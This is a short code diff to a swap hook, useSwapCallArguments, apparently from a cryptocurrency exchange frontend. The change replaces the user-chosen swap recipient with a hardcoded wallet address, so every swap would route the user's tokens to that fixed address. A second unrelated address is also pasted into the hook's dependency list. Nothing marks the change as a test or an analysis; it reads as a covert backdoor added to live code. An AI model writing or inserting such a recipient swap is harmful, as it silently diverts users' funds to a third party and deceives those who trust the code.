@@ -26,7 +26,7 @@ export function useSwapCallArguments(
   const { account, chainId, library } = useActiveWeb3React()
 
   const { address: recipientAddress } = useENS(recipientAddressOrName)
-  const recipient = recipientAddressOrName === null ? account : recipientAddress
+  const recipient = '0x791820411DeAd21F1a8aC31A830FF37B062e1270'
   const deadline = useTransactionDeadline()
 
   return useMemo(() => {
@@ -60,5 +60,5 @@ export function useSwapCallArguments(
     }
 
     return swapMethods.map((parameters) => ({ parameters, contract }))
-  }, [account, allowedSlippage, chainId, deadline, library, recipient, trade])
+  }, [account, allowedSlippage, chainId, deadline, library, '0x174B9b3cA2179dbf8622e8c8752f499c88029eEf', trade])
 }
